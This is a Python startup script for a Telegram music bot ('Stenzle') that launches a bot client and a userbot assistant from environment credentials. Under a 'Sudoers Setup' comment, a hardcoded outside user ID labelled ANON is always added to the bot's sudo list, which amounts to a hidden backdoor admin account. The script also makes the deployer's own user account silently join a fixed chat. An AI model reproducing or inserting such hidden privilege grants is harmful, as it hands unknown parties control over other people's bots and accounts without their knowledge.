import os
from os import getenv
import asyncio
import logging
import time
from pyrogram import Client, filters, idle
from pytgcalls import PyTgCalls
import config

# Environment Variables
API_ID = int(getenv("API_ID"))
API_HASH = getenv("API_HASH")
BOT_TOKEN = getenv("BOT_TOKEN")
STRING_SESSION = getenv("STRING_SESSION")
StartTime = time.time()

# Logging Setup
logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("Stenzlelogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("StenzleMusic")

# app (The Bot)
app = Client(
    "StenzleBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

# app2 (The Assistant/Userbot)
app2 = Client(
    name="StenzleAssistant",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION
)

pytgcalls = PyTgCalls(app2)
SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1] if "me/" in config.SUPPORT_CHAT else config.SUPPORT_CHAT

async def Stenzle_startup():
    os.system("clear")
    LOGGER.info("Starting Stenzle Music Bot...")
    
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, Stenzledb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    # Start Bot
    await app.start()
    getme = await app.get_me()
    BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION = getme.id, getme.first_name, getme.username, getme.mention

    # Start Assistant
    await app2.start()
    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    
    try:
        await app2.join_chat("KURUK_SHE_TRA")
    except:
        pass

    # Sudoers Setup
    ANON = "1356469075"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    SUDOERS.add(int(ANON))

    Stenzledb = {}
    LOGGER.info("[•] Stenzle Music Clients Booted Successfully.")
    
    # KEEP RUNNING: idle() must be the last thing inside the startup function
    await idle()
    
    # Graceful shutdown
    await app.stop()
    await app2.stop()

if __name__ == "__main__":
    try:
        asyncio.get_event_loop().run_until_complete(Stenzle_startup())
    except KeyboardInterrupt:
        pass
